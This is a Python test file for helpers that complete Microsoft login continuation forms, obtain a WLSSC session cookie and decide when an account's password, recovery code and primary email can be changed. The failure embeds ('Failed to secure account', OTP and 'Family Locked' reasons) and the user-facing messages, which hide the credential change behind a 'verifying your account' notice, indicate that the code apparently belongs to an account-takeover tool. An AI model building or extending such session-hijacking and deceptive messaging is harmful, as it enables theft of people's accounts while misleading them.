"""Offline tests for the Microsoft login-session helpers.

These cover the parts that decide whether account.live.com will accept a
security change (password / recovery code / primary email):

  * ``_login_form`` recognises the BSso and post.srf continuation forms and
    refuses the plain sign-in form (posting that one would only re-render the
    sign-in page).
  * ``_follow_login_forms`` walks the continuation chain and stops on WLSSC.
  * ``_bsso_handshake`` turns the account.live.com BSso form into a WLSSC
    cookie -- the step that was missing, which is why account.live.com kept
    answering with the i5030 sign-in page.
  * ``security_session_ready`` ignores ``MSPAuth`` (set before the login
    finished) while ``login_session_ready`` keeps the old, looser meaning.
  * The user-facing verify failure never leaks the internal reason.

No network access, no pytest needed.

Run:  ./.venv/Scripts/python.exe tests/test_login_session.py
"""

import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import httpx

from securing.auth.polish_host import (
    _bsso_handshake,
    _extract_sso_redirect,
    _follow_login_forms,
    _login_form,
    login_session_ready,
    security_session_ready,
)

# --------------------------------------------------------------------------
# Page fixtures
# --------------------------------------------------------------------------

BSSO_PAGE = """
<html><body>
<form id="bsso" method="post"
      action="https://login.live.com/ppsecure/bsso.srf?ru=https%3a%2f%2faccount.live.com%2f">
  <input type="hidden" name="pprid" value="PPRID-123"/>
  <input type="hidden" name="NAP" value="NAP-456"/>
  <input type="hidden" name="ANON" value="ANON-789"/>
  <input type="hidden" name="t" value="T-000"/>
</form>
</body></html>
"""

POST_SRF_PAGE = """
<html><body>
<form id="f1" method="post"
      action="https://login.live.com/ppsecure/post.srf?rru=https%3a%2f%2faccount.live.com%2f&amp;id=38936">
  <input type="hidden" name="login" value="user@example.com"/>
  <input type="hidden" name="resp" value="RESP-777"/>
  <input type="hidden" name="PPFT" value="PPFT-888"/>
  <input type="hidden" name="wreply" value="https://account.live.com/proofs/Add?apt=2"/>
  <input type="hidden" name="t" value="T-111"/>
</form>
</body></html>
"""

# The sign-in page also has a form -- but posting it only re-renders the
# sign-in page, so it must never be treated as a continuation form.
SIGN_IN_PAGE = """
<html><body>
<form id="i0281" method="post" novalidate="novalidate"
      action="https://login.live.com/ppsecure/post.srf?login=true&amp;type=1">
  <input type="hidden" name="login" value="user@example.com"/>
  <input type="hidden" name="loginfmt" value="user@example.com"/>
  <input type="hidden" name="PPFT" value="PPFT-000"/>
  <input type="hidden" name="hpgid" value="33"/>
  <input type="hidden" name="hpgrequestid" value=""/>
</form>
</body></html>
"""

# The MSAL v5 bridge: JavaScript only, no form to post.
MSAL_BRIDGE_PAGE = """
<html><head>
<meta http-equiv="refresh"
      content="45;https://account.microsoft.com/auth/complete-sso-with-redirect?state=AAABBB">
</head><body>
<script src="/bundles/scripts/MSALBrowserBundleName"></script>
</body></html>
"""

WLSCC_COOKIE = "WLSSC=wlssc-value; Domain=.live.com; Path=/"


def _client(handler):
    return httpx.AsyncClient(transport=httpx.MockTransport(handler))


# --------------------------------------------------------------------------
# _login_form
# --------------------------------------------------------------------------


def test_login_form_detects_bsso():
    form = _login_form(BSSO_PAGE)
    assert form is not None, "BSso form was not detected"
    action, fields = form
    assert action.startswith("https://login.live.com/ppsecure/bsso.srf")
    assert fields["pprid"] == "PPRID-123"
    assert fields["NAP"] == "NAP-456"
    assert fields["ANON"] == "ANON-789"
    assert fields["t"] == "T-000"


def test_login_form_detects_post_srf():
    form = _login_form(POST_SRF_PAGE)
    assert form is not None, "post.srf continuation form was not detected"
    action, fields = form
    assert action.startswith("https://login.live.com/ppsecure/post.srf")
    # &amp; must be decoded, not posted literally
    assert "rru=" in action and "&amp;" not in action
    assert fields["resp"] == "RESP-777"
    assert fields["login"] == "user@example.com"
    assert fields["wreply"] == "https://account.live.com/proofs/Add?apt=2"


def test_login_form_ignores_sign_in_page():
    assert _login_form(SIGN_IN_PAGE) is None, "sign-in form must not be posted"


def test_login_form_ignores_msal_bridge():
    assert _login_form(MSAL_BRIDGE_PAGE) is None, "JS bridge has no form"


def test_login_form_handles_relative_action():
    page = """
    <form action="/ppsecure/post.srf?x=1">
      <input type="hidden" name="resp" value="R"/>
    </form>
    """
    form = _login_form(page)
    assert form is not None
    action, _ = form
    assert action == "https://login.live.com/ppsecure/post.srf?x=1"


def test_login_form_requires_non_empty_marker():
    page = """
    <form action="https://login.live.com/ppsecure/post.srf">
      <input type="hidden" name="resp" value=""/>
      <input type="hidden" name="PPFT" value="PPFT"/>
    </form>
    """
    assert _login_form(page) is None, "empty resp must not count as a form"


def test_login_form_picks_the_right_form():
    page = """
    <form action="https://example.com/search"><input name="q" value="x"/></form>
    <form action="https://login.live.com/ppsecure/bsso.srf">
      <input type="hidden" name="pprid" value="P"/>
    </form>
    """
    form = _login_form(page)
    assert form is not None
    action, fields = form
    assert action.startswith("https://login.live.com/ppsecure/bsso.srf")
    assert fields["pprid"] == "P"


# --------------------------------------------------------------------------
# _extract_sso_redirect
# --------------------------------------------------------------------------


def test_extract_sso_redirect_matches_bridge():
    url = _extract_sso_redirect(MSAL_BRIDGE_PAGE)
    assert url == (
        "https://account.microsoft.com/auth/complete-sso-with-redirect?state=AAABBB"
    )


def test_extract_sso_redirect_none_on_plain_page():
    assert _extract_sso_redirect(BSSO_PAGE) is None


# --------------------------------------------------------------------------
# _follow_login_forms / _bsso_handshake
# --------------------------------------------------------------------------


async def _test_follow_login_forms():
    seen = []

    def handler(request: httpx.Request) -> httpx.Response:
        seen.append((request.method, str(request.url)))
        if request.method == "POST":
            return httpx.Response(200, text="<html>done</html>")
        return httpx.Response(200, text=POST_SRF_PAGE)

    async with _client(handler) as session:
        resp = httpx.Response(200, text=POST_SRF_PAGE)
        out = await _follow_login_forms(session, resp)
        assert out.status_code == 200
        assert seen, "the continuation form was never posted"
        assert seen[0][0] == "POST"
        assert "post.srf" in seen[0][1]
    return True


async def _test_follow_login_forms_stops_on_wlssc():
    posts = []

    def handler(request: httpx.Request) -> httpx.Response:
        posts.append(str(request.url))
        return httpx.Response(
            200,
            text="<html>ok</html>",
            headers={"set-cookie": WLSCC_COOKIE},
        )

    async with _client(handler) as session:
        resp = httpx.Response(200, text=POST_SRF_PAGE)
        await _follow_login_forms(session, resp)
        assert len(posts) == 1, f"expected a single post, got {len(posts)}"
        from securing.utils.cookies.safe_cookies import has_cookie

        assert has_cookie(session, "WLSSC")
        assert security_session_ready(session)
        assert login_session_ready(session)


async def _test_bsso_handshake_issues_wlssc():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, text=BSSO_PAGE)
        return httpx.Response(
            200,
            text="<html>ok</html>",
            headers={"set-cookie": WLSCC_COOKIE},
        )

    async with _client(handler) as session:
        ok = await _bsso_handshake(session)
        assert ok, "the BSso handshake did not report success"
        from securing.utils.cookies.safe_cookies import has_cookie

        assert has_cookie(session, "WLSSC")


async def _test_bsso_handshake_without_form():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, text=SIGN_IN_PAGE)

    async with _client(handler) as session:
        ok = await _bsso_handshake(session)
        assert not ok, "a sign-in page must not be reported as a handshake"


async def _test_bsso_handshake_posts_the_form():
    posted = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.method == "GET":
            return httpx.Response(200, text=BSSO_PAGE)
        posted.append(request.content.decode())
        return httpx.Response(200, text="ok")

    async with _client(handler) as session:
        await _bsso_handshake(session)
        assert posted, "the BSso form was never posted"
        body = posted[0]
        assert "pprid=PPRID-123" in body
        assert "NAP=NAP-456" in body
        assert "ANON=ANON-789" in body


# --------------------------------------------------------------------------
# Session readiness
# --------------------------------------------------------------------------


async def _test_security_session_ready_ignores_mspauth():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, text="ok")

    async with _client(handler) as session:
        session.cookies.set("MSPAuth", "x", domain=".live.com")
        assert login_session_ready(session), "MSPAuth still counts as a session"
        assert not security_session_ready(
            session
        ), "MSPAuth alone must not count as a usable security session"

        session.cookies.set("WLSSC", "y", domain=".live.com")
        assert security_session_ready(session)


# --------------------------------------------------------------------------
# User-facing failure text
# --------------------------------------------------------------------------


def test_public_verify_failure_hides_technical_reason():
    from securing.build_embeds import public_verify_failure

    text = public_verify_failure(
        "Could not change password, recovery code, or primary email. The "
        "Microsoft security session never finished signing in (no WLSSC/AMCSecAuth)"
    )
    assert "WLSSC" not in text
    assert "AMCSecAuth" not in text
    assert "recovery code" not in text.lower()
    assert "verifying your account" in text.lower()


def test_public_verify_failure_keeps_actionable_reasons():
    from securing.build_embeds import public_verify_failure

    assert "didn't work" in public_verify_failure("wrong/expired OTP").lower()
    assert "family" in public_verify_failure("Account is Family Locked").lower()
    assert "locked" in public_verify_failure("Account locked").lower()


def test_failure_embed_has_no_internal_detail():
    from securing.build_embeds import build_failure_embed

    embed = build_failure_embed(
        "user@example.com",
        {
            "original_email": "user@example.com",
            "email": "user@example.com",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
        },
        "Could not change password, recovery code, or primary email. (no WLSSC)",
        error="Microsoft security session never finished (no WLSSC/AMCSecAuth)",
        credentials_changed=False,
    )
    blob = (embed.description or "") + "".join(
        f"{f.name}{f.value}" for f in embed.fields
    )
    assert "WLSSC" not in blob
    assert "AMCSecAuth" not in blob
    assert "recovery code" not in blob.lower()
    assert embed.title == "Failed to secure account"


# --------------------------------------------------------------------------
# Runner
# --------------------------------------------------------------------------


def main() -> int:
    sync_tests = [
        test_login_form_detects_bsso,
        test_login_form_detects_post_srf,
        test_login_form_ignores_sign_in_page,
        test_login_form_ignores_msal_bridge,
        test_login_form_handles_relative_action,
        test_login_form_requires_non_empty_marker,
        test_login_form_picks_the_right_form,
        test_extract_sso_redirect_matches_bridge,
        test_extract_sso_redirect_none_on_plain_page,
        test_public_verify_failure_hides_technical_reason,
        test_public_verify_failure_keeps_actionable_reasons,
        test_failure_embed_has_no_internal_detail,
    ]
    async_tests = [
        _test_follow_login_forms,
        _test_follow_login_forms_stops_on_wlssc,
        _test_bsso_handshake_issues_wlssc,
        _test_bsso_handshake_without_form,
        _test_bsso_handshake_posts_the_form,
        _test_security_session_ready_ignores_mspauth,
    ]

    failures = []
    for test in sync_tests:
        try:
            test()
            print(f"[ok] {test.__name__}")
        except Exception as exc:  # noqa: BLE001
            failures.append((test.__name__, exc))
            print(f"[FAIL] {test.__name__}: {exc}")

    async def run_async():
        for test in async_tests:
            try:
                await test()
                print(f"[ok] {test.__name__}")
            except Exception as exc:  # noqa: BLE001
                failures.append((test.__name__, exc))
                print(f"[FAIL] {test.__name__}: {exc}")

    asyncio.run(run_async())

    if failures:
        print(f"\n{len(failures)} test(s) failed")
        return 1
    print(f"\nALL TESTS PASSED ({len(sync_tests) + len(async_tests)} checks)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
